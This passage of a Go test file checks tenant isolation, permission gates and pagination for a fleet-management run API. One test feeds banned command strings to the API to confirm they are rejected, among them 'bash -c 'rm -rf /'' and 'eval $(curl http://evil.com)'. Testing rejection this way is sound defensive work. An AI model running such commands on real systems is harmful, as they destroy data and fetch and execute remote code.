//   - AssuranceMachine (API key / relay-grant) principal sees only same-tenant runs.
//   - Relay-grant principals (AssuranceMachine) cannot see another tenant's run.
func TestRunVisibleTo_AssuranceBoundary(t *testing.T) {
	run := &controllerrun.RunRecord{RunID: "r1", TenantID: "tenant-a"}

	cases := []struct {
		name      string
		principal *Principal
		tenantID  string
		wantVis   bool
	}{
		{
			// Admin callers (mTLS, empty TenantID) have unrestricted access.
			// In real requests, tenantID comes from ctxkeys.TenantID which equals
			// principal.TenantID — for admins that is "" (unrestricted).
			name:      "AssuranceBasic_admin_any_tenant",
			principal: &Principal{ID: "admin", Assurance: session.AssuranceBasic, GlobalScope: true, TenantID: ""},
			tenantID:  "",
			wantVis:   true,
		},
		{
			name:      "AssuranceMachine_same_tenant",
			principal: &Principal{ID: "key-a", Assurance: session.AssuranceMachine, TenantID: "tenant-a"},
			tenantID:  "tenant-a",
			wantVis:   true,
		},
		{
			name:      "AssuranceMachine_cross_tenant_hidden",
			principal: &Principal{ID: "key-b", Assurance: session.AssuranceMachine, TenantID: "tenant-b"},
			tenantID:  "tenant-b",
			wantVis:   false,
		},
		{
			// Defense-in-depth: relay-grant principal (AssuranceMachine, tenant-a scoped)
			// must not see a tenant-b run even if the grant's tenantID were somehow wrong.
			name: "relay_grant_cross_tenant_hidden",
			principal: &Principal{
				ID:        "relay:device-1:exec-001",
				Assurance: session.AssuranceMachine,
				TenantID:  "tenant-b", // mis-scoped grant scenario
			},
			tenantID: "tenant-b",
			wantVis:  false, // run.TenantID=tenant-a ≠ tenantID=tenant-b
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			got := runVisibleTo(tc.principal, run, tc.tenantID)
			assert.Equal(t, tc.wantVis, got,
				"runVisibleTo(%+v, run{TenantID=%q}, tenantID=%q)",
				tc.principal, run.TenantID, tc.tenantID)
		})
	}
}

// TestRunVisibleTo_SessionPrincipal_CrossTenantBlocked verifies the fix for Issue
// #3143: a session-authenticated principal has GlobalScope=true (set by middleware)
// even when scoped to a specific tenant. Before the fix, the GlobalScope flag caused
// runVisibleTo to return true for any run regardless of the caller's tenant. After
// the fix, only callerTenant (from ctxkeys.TenantID) governs access.
func TestRunVisibleTo_SessionPrincipal_CrossTenantBlocked(t *testing.T) {
	// Simulate a web-session principal as middleware.go builds it: GlobalScope=true
	// because it is hardcoded, but TenantID correctly set from the session.
	sessionPrincipal := &Principal{
		ID:          "web-acct-abc",
		GlobalScope: true, // the middleware bug — this flag must no longer gate cross-tenant access
		TenantID:    "tenant-a",
		Assurance:   session.AssuranceBasic,
	}

	runOwnTenant := &controllerrun.RunRecord{RunID: "r-own", TenantID: "tenant-a"}
	runOtherTenant := &controllerrun.RunRecord{RunID: "r-other", TenantID: "tenant-b"}

	// tenantID = "tenant-a" (as set by withPrincipal via ctxkeys.TenantID in real requests).
	assert.True(t, runVisibleTo(sessionPrincipal, runOwnTenant, "tenant-a"),
		"session principal must see runs belonging to their own tenant")
	assert.False(t, runVisibleTo(sessionPrincipal, runOtherTenant, "tenant-a"),
		"session principal must NOT see runs belonging to a different tenant (Issue #3143)")
}

// ── [REQUIRED TEST] GlobalScope ⊥ Assurance independence (Issue #2787) ───────

// TestGlobalScope_IndependentOfAssurance proves that GlobalScope and Assurance
// are genuinely independent signals — not just relabeled versions of each other.
// A hypothetical future tenant-scoped-but-strongly-authenticated platform admin
// (Assurance=AssuranceStrong, GlobalScope=false, ImplicitAdmin=true) must be:
//   - Confined by the tenant-scope sites (runVisibleTo returns false for cross-tenant)
//   - Still admitted by auth-strength-gated actions (hasPermission returns true via
//     ImplicitAdmin; requirePermission admits on AssuranceStrong-gated routes)
//
// This principal is not constructible by any current code path. The test proves
// that if such an account type were ever added, the two signals would correctly
// remain independent: the account would see only its own tenant's data but could
// still perform strongly-authenticated operations.
func TestGlobalScope_IndependentOfAssurance(t *testing.T) {
	// Hypothetical tenant-scoped implicit-admin principal with strong assurance —
	// not producible today. ImplicitAdmin: true reflects that permission breadth is
	// an explicit grant, not inferred from Assurance (ADR-025 Amendment 3).
	strongScoped := &Principal{
		ID:            "future-strong-scoped-account",
		Assurance:     session.AssuranceStrong,
		GlobalScope:   false,
		TenantID:      "tenant-a",
		ImplicitAdmin: true,
	}

	// Tenant-scope sites: GlobalScope=false confines the principal regardless of Assurance.
	run := &controllerrun.RunRecord{RunID: "r-other", TenantID: "tenant-b"}
	assert.False(t, runVisibleTo(strongScoped, run, "tenant-a"),
		"AssuranceStrong+GlobalScope:false principal must be tenant-confined by runVisibleTo (cross-tenant run must be invisible)")
	assert.True(t, runVisibleTo(strongScoped, &controllerrun.RunRecord{RunID: "r-same", TenantID: "tenant-a"}, "tenant-a"),
		"AssuranceStrong+GlobalScope:false principal must see same-tenant runs")

	// Permission breadth: ImplicitAdmin passes regardless of GlobalScope.
	server := setupTestServer(t)
	assert.True(t, server.hasPermission(strongScoped, "certificate:provision"),
		"ImplicitAdmin principal must pass hasPermission for any permission regardless of GlobalScope")
	assert.True(t, server.hasPermission(strongScoped, "rbac:create-role"),
		"ImplicitAdmin principal must pass hasPermission for strong-gated permissions regardless of GlobalScope")

	// requirePermission must admit the principal on an AssuranceStrong-gated route.
	admitted := false
	handler := server.requirePermission("certificate", "provision")(
		http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			admitted = true
			w.WriteHeader(http.StatusOK)
		}))
	req := httptest.NewRequest(http.MethodPost, "/", nil)
	req = req.WithContext(context.WithValue(req.Context(), principalContextKey, strongScoped))
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	assert.True(t, admitted,
		"ImplicitAdmin+GlobalScope:false principal must be admitted by requirePermission on a Strong-gated route (body: %s)", rec.Body.String())
}

// TestAuthRunAccess_DoesNotConsultGlobalScope proves the empty-tenant admission gate in
// authRunAccess (handlers_runs.go) keys off principal.Assurance, not principal.GlobalScope
// (Issue #3143 acceptance follow-up). GlobalScope is hardcoded true on every session
// principal by middleware.go, so gating admission on "!principal.GlobalScope" is a dead
// check for session principals — it can never fire regardless of whether the caller is
// genuinely entitled to operate with an empty tenant. Flip GlobalScope on both sides of
// the table below: only Assurance should determine the outcome.
func TestAuthRunAccess_DoesNotConsultGlobalScope(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)

	// GlobalScope=false (as a correctly-scoped session principal would be, absent the
	// middleware bug) must still be ADMITTED when Assurance is not machine-level —
	// admission for an empty-tenant caller depends on Assurance, not GlobalScope.
	humanNoTenant := &Principal{ID: "session-acct", Assurance: session.AssuranceBasic, GlobalScope: false, TenantID: ""}
	req := withPrincipal(httptest.NewRequest(http.MethodGet, "/api/v1/runs/whatever", nil), humanNoTenant)
	rec := httptest.NewRecorder()
	_, _, ok := server.authRunAccess(rec, req)
	assert.True(t, ok, "Assurance-based admission must admit a non-machine empty-tenant principal even with GlobalScope=false; body: %s", rec.Body.String())

	// GlobalScope=true (mirroring the middleware bug) must NOT rescue a machine
	// (API-key-style) principal with no tenant — it must still be rejected.
	machineNoTenant := &Principal{ID: "bugged-key", Assurance: session.AssuranceMachine, GlobalScope: true, TenantID: ""}
	req2 := withPrincipal(httptest.NewRequest(http.MethodGet, "/api/v1/runs/whatever", nil), machineNoTenant)
	rec2 := httptest.NewRecorder()
	_, _, ok2 := server.authRunAccess(rec2, req2)
	assert.False(t, ok2, "a machine-assurance empty-tenant principal must be rejected regardless of GlobalScope")
	assert.Equal(t, http.StatusUnauthorized, rec2.Code)
}

// ---- [REQUIRED TEST] Banned-pattern enforcement (C2) -------------------------

// TestRunCommandSingle_RejectsBannedPattern_ControllerSide verifies that
// POST /api/v1/runs/command returns HTTP 400 with BANNED_PATTERN for each
// prohibited command pattern (CLAUDE.md §Modules, execution path 3).
func TestRunCommandSingle_RejectsBannedPattern_ControllerSide(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	cases := []struct {
		name    string
		command string
	}{
		{"iex", "iex (Get-Content malicious.ps1 -Raw)"},
		{"Invoke-Expression", "Invoke-Expression $payload"},
		{"EncodedCommand", "powershell -EncodedCommand base64stuff"},
		{"ExecutionPolicyBypass", "powershell -ExecutionPolicy Bypass -File x.ps1"},
		{"bash-c", "bash -c 'rm -rf /'"},
		{"eval", "eval $(curl http://evil.com)"},
		{"python-c", "python -c 'import os; os.system(\"id\")'"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rec := postRunCommand(t, server, apiKey, map[string]interface{}{
				"target":  "id:steward-abc",
				"content": base64.StdEncoding.EncodeToString([]byte(tc.command)),
				"shell":   "bash",
			})
			assert.Equal(t, http.StatusBadRequest, rec.Code,
				"command with pattern %q must return 400, body: %s", tc.name, rec.Body.String())

			var resp ErrorResponse
			require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
			require.NotNil(t, resp.Error, "must return an error object")
			assert.Equal(t, "BANNED_PATTERN", resp.Error.Code,
				"error code must be BANNED_PATTERN for pattern %q", tc.name)
		})
	}
}

// ---- [REQUIRED TEST] Cross-tenant RBAC (C3) ----------------------------------

// TestRunCommandSingle_RejectsCrossTenantSteward verifies that
// POST /api/v1/runs/command returns HTTP 403 when the principal's tenant is
// not a path-prefix of the target steward's tenant.
func TestRunCommandSingle_RejectsCrossTenantSteward(t *testing.T) {
	// Steward belongs to "msp-a" — not reachable from "test-tenant".
	stewards := []fleet.StewardResult{
		{ID: "steward-cross", TenantID: "msp-a"},
	}
	server, _, _ := setupRunServer(t, stewards)

	// test-tenant principal: cannot access stewards in msp-a.
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})

	rec := postRunCommand(t, server, apiKey, map[string]interface{}{
		"target":  "id:steward-cross",
		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
		"shell":   "bash",
	})
	assert.Equal(t, http.StatusForbidden, rec.Code,
		"cross-tenant exec must return 403; body: %s", rec.Body.String())

	var resp ErrorResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	require.NotNil(t, resp.Error)
	assert.Equal(t, "FORBIDDEN", resp.Error.Code)
}

// ---- Service unavailable when manager not wired -----------------------------

func TestRunEndpoints_ServiceUnavailable_WhenManagerNotWired(t *testing.T) {
	server := setupTestServer(t)
	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts", "steward:read-scripts"})

	for _, tc := range []struct {
		method string
		path   string
		body   interface{}
	}{
		{"POST", "/api/v1/runs/script", map[string]interface{}{"script_id": "s.sh"}},
		{"POST", "/api/v1/runs/command", map[string]interface{}{"content": "X", "shell": "bash"}},
		{"GET", "/api/v1/runs/some-id", nil},
		{"GET", "/api/v1/runs/some-id/jobs", nil},
		{"DELETE", "/api/v1/runs/some-id", nil},
	} {
		t.Run(tc.method+" "+tc.path, func(t *testing.T) {
			var body *bytes.Reader
			if tc.body != nil {
				b, err := json.Marshal(tc.body)
				require.NoError(t, err)
				body = bytes.NewReader(b)
			} else {
				body = bytes.NewReader(nil)
			}
			req := httptest.NewRequest(tc.method, tc.path, body)
			req.Header.Set("X-API-Key", apiKey)
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			server.router.ServeHTTP(rec, req)
			assert.Equal(t, http.StatusServiceUnavailable, rec.Code,
				"%s %s must return 503 when run manager is not wired", tc.method, tc.path)
		})
	}
}

// TestAllowedShellsMatchesExecutorTaxonomy pins the controller allow-list to the
// steward executor's accepted shells so the two never drift (Issue #1995, root
// cause B). The unified taxonomy is: bash/sh (Unix), powershell/pwsh/cmd (Windows),
// with pwsh also valid on Unix.
func TestAllowedShellsMatchesExecutorTaxonomy(t *testing.T) {
	want := map[string]bool{
		string(scriptmodule.ShellBash):       true,
		string(scriptmodule.ShellSh):         true,
		string(scriptmodule.ShellPowerShell): true,
		string(scriptmodule.ShellPwsh):       true,
		string(scriptmodule.ShellCmd):        true,
	}

	assert.Equal(t, want, allowedShells,
		"controller allow-list must match the executor shell taxonomy")

	// Specifically guard the two shells regressed in Issue #1995.
	assert.True(t, allowedShells["powershell"], "Windows PowerShell 5.1 must be dispatchable")
	assert.True(t, allowedShells["pwsh"], "PowerShell Core must be dispatchable")
}

// ── handleListRuns tests ──────────────────────────────────────────────────────

// listRunsAs sends GET /api/v1/runs with the given principal and optional query string.
func listRunsAs(server *Server, principal *Principal, query string) *httptest.ResponseRecorder {
	url := "/api/v1/runs"
	if query != "" {
		url += "?" + query
	}
	req := httptest.NewRequest(http.MethodGet, url, nil)
	req = withPrincipal(req, principal)
	rec := httptest.NewRecorder()
	server.handleListRuns(rec, req)
	return rec
}

// TestHandleListRuns_NilManager_Returns503 verifies the service-unavailable guard.
func TestHandleListRuns_NilManager_Returns503(t *testing.T) {
	server := setupTestServer(t)
	// runManager is nil by default in setupTestServer.
	rec := listRunsAs(server, adminRunPrincipal(), "")
	require.Equal(t, http.StatusServiceUnavailable, rec.Code)

	var resp ErrorResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	assert.Equal(t, "SERVICE_UNAVAILABLE", resp.Error.Code)
}

// adminRunPrincipal returns a global-admin principal for run handler tests.
func adminRunPrincipal() *Principal {
	return &Principal{ID: "cfgms-admin", Assurance: session.AssuranceBasic, GlobalScope: true, TenantID: ""}
}

// TestHandleListRuns_NoPrincipal_Returns401 verifies the auth guard.
func TestHandleListRuns_NoPrincipal_Returns401(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/runs", nil)
	rec := httptest.NewRecorder()
	server.handleListRuns(rec, req)
	require.Equal(t, http.StatusUnauthorized, rec.Code)
}

// TestHandleListRuns_EmptyList_NeverNull verifies that an empty store returns [] not null.
func TestHandleListRuns_EmptyList_NeverNull(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)

	rec := listRunsAs(server, adminRunPrincipal(), "")
	require.Equal(t, http.StatusOK, rec.Code)

	var raw map[string]json.RawMessage
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &raw))
	assert.Equal(t, json.RawMessage("[]"), raw["data"], "empty run list must serialize as [] not null")
}

// TestHandleListRuns_CrossTenantIsolation is the [REQUIRED TEST] verifying that a
// principal in tenant A cannot see tenant B's runs.
func TestHandleListRuns_CrossTenantIsolation(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "s-1", TenantID: "tenant-a"}}
	server, _, _ := setupRunServer(t, stewards)

	principalA := &Principal{ID: "user-a", TenantID: "tenant-a", Assurance: session.AssuranceMachine}
	principalB := &Principal{ID: "user-b", TenantID: "tenant-b", Assurance: session.AssuranceMachine}

	// Create a run under tenant-a.
	recA := postRunWithPrincipal(t, server.handlePostRunScript, "/api/v1/runs/script", principalA,
		map[string]interface{}{"target": "all", "script_id": "scripts/a.sh"})
	require.Equal(t, http.StatusOK, recA.Code, "create run for tenant-a: %s", recA.Body.String())

	// Create a run under tenant-b.
	recB := postRunWithPrincipal(t, server.handlePostRunScript, "/api/v1/runs/script", principalB,
		map[string]interface{}{"target": "all", "script_id": "scripts/b.sh"})
	require.Equal(t, http.StatusOK, recB.Code, "create run for tenant-b: %s", recB.Body.String())

	// List as tenant-a: must see exactly 1 run belonging to tenant-a.
	recList := listRunsAs(server, principalA, "")
	require.Equal(t, http.StatusOK, recList.Code)

	var resp APIResponse
	require.NoError(t, json.Unmarshal(recList.Body.Bytes(), &resp))
	runs, ok := resp.Data.([]interface{})
	require.True(t, ok, "data must be an array")
	require.Len(t, runs, 1, "tenant-a must see exactly 1 run, not tenant-b's")

	runMap, ok := runs[0].(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, "tenant-a", runMap["tenant_id"], "the visible run must belong to tenant-a")

	// List as tenant-b: must see exactly 1 run belonging to tenant-b.
	recListB := listRunsAs(server, principalB, "")
	require.Equal(t, http.StatusOK, recListB.Code)

	var respB APIResponse
	require.NoError(t, json.Unmarshal(recListB.Body.Bytes(), &respB))
	runsB, ok := respB.Data.([]interface{})
	require.True(t, ok, "data must be an array")
	require.Len(t, runsB, 1, "tenant-b must see exactly 1 run, not tenant-a's")

	runMapB, ok := runsB[0].(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, "tenant-b", runMapB["tenant_id"])
}

// [REQUIRED TEST] TestHandleListRuns_PaginationClamping verifies that limit/offset
// clamping mirrors the convention in handlers_audit.go.
func TestHandleListRuns_PaginationClamping(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	p := adminRunPrincipal()

	// limit > 500 is silently clamped; request must succeed.
	rec := listRunsAs(server, p, "limit=9999")
	assert.Equal(t, http.StatusOK, rec.Code, "limit=9999 must be clamped to 500, not error")

	// limit=0 is clamped to 1; request must succeed.
	rec = listRunsAs(server, p, "limit=0")
	assert.Equal(t, http.StatusOK, rec.Code, "limit=0 must be clamped to 1, not error")

	// Non-numeric params are silently ignored; defaults apply.
	rec = listRunsAs(server, p, "limit=notanumber&offset=bad")
	assert.Equal(t, http.StatusOK, rec.Code, "invalid params must be silently ignored")

	// Valid offset with no data returns empty list.
	rec = listRunsAs(server, p, "offset=100&limit=10")
	assert.Equal(t, http.StatusOK, rec.Code)
}

// TestHandleListRuns_PaginationOffsetLimit verifies that offset and limit correctly
// slice the result set.
func TestHandleListRuns_PaginationOffsetLimit(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "s-1", TenantID: "tenant-pg"}}
	server, _, _ := setupRunServer(t, stewards)
	p := &Principal{ID: "user-pg", TenantID: "tenant-pg", Assurance: session.AssuranceMachine}

	// Create 3 runs.
	for i := 0; i < 3; i++ {
		rec := postRunWithPrincipal(t, server.handlePostRunScript, "/api/v1/runs/script", p,
			map[string]interface{}{"target": "all", "script_id": "scripts/pg.sh"})
		require.Equal(t, http.StatusOK, rec.Code)
	}

	// Fetch all 3 with a generous limit.
	rec := listRunsAs(server, p, "limit=10")
	require.Equal(t, http.StatusOK, rec.Code)
	var resp APIResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	all, ok := resp.Data.([]interface{})
	require.True(t, ok)
	require.Len(t, all, 3, "limit=10 must return all 3 runs")

	// Fetch with limit=2: should return exactly 2.
	rec = listRunsAs(server, p, "limit=2")
	require.Equal(t, http.StatusOK, rec.Code)
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	page1, ok := resp.Data.([]interface{})
	require.True(t, ok)
	assert.Len(t, page1, 2, "limit=2 must return exactly 2 runs")

	// Fetch with offset=2 and limit=10: should return exactly 1.
	rec = listRunsAs(server, p, "limit=10&offset=2")
	require.Equal(t, http.StatusOK, rec.Code)
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	page2, ok := resp.Data.([]interface{})
	require.True(t, ok)
	assert.Len(t, page2, 1, "offset=2 must return the remaining 1 run")
}
